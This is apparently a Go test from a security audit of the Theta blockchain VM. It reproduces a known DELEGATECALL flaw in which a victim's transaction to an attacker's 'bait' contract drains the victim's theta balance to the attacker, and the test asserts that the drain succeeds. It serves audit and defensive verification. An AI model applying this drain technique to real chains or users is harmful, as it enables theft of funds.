package vm

// AUDIT PoC A - harness sanity check: reproduces the already-known
// "DELEGATECALL to 0xCB inherits CallerAddress" drain so that the rest of the
// PoCs can be trusted.

import (
	"math/big"
	"testing"

	"github.com/thetatoken/theta/common"
)

func TestAuditA_Sanity_KnownDelegatecallDrain(t *testing.T) {
	sv := newAuditView(t)

	setBalance(t, sv, victimEOA, thetaN(100), big.NewInt(0))
	setBalance(t, sv, attackerEOA, big.NewInt(0), big.NewInt(0))
	setCode(t, sv, helperCtr, drainerRuntime(attackerEOA))

	// the victim's own tx calls the attacker's contract (the "bait")
	if _, err := runTx(t, sv, victimEOA, helperCtr, nil, 1_000_000, big.NewInt(0), big.NewInt(0)); err != nil {
		t.Fatalf("tx failed: %v", err)
	}

	t.Logf("victim   = %v", thetaOf(sv, victimEOA))
	t.Logf("attacker = %v", thetaOf(sv, attackerEOA))

	if thetaOf(sv, victimEOA).Sign() != 0 {
		t.Fatalf("expected victim drained, got %v", thetaOf(sv, victimEOA))
	}
	if thetaOf(sv, attackerEOA).Cmp(thetaN(100)) != 0 {
		t.Fatalf("expected attacker to hold 100 theta, got %v", thetaOf(sv, attackerEOA))
	}
}

var _ = common.Address{}
